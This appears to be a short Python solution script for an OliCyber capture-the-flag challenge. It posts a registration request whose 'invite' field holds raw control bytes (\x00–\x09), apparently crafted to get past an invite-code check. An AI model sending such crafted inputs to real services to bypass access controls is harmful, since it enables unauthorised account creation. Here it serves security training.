import requests

api_url = "http://frittomisto.challs.olicyber.it/api/register"

data = {
    "username": "uisgdlakgsdua",
    "password": "-laskdgliasbgbdòliashd",
    "invite": "\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09",
}

response = requests.post(api_url, json=data)
print(response.status_code)
print(response.text)